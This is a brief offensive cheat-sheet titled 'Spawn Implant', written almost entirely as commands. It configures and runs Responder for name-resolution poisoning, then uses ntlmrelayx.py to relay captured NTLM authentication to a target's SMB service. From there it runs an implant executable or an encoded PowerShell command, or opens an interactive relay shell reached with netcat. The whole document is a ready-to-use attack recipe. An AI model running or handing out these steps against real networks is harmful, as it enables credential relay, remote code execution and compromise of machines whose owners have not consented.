# Spawn Implant

Modify in the Responder configuration file

```
$ sudo nano /etc/responder/Responder.conf
..[omitted]..
SMB=OFF
HTTP=OFF
```

Start the `responder`.

```
$ sudo responder -I <interface> -rdw
```

Spawn callback shell.

```
$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -e implant.exe

$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -c "powershell.exe -E <base64_encoded>"
```

Interactive shell with netcat

```
$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -i

$ nc 127.0.0.1 <PORT>
```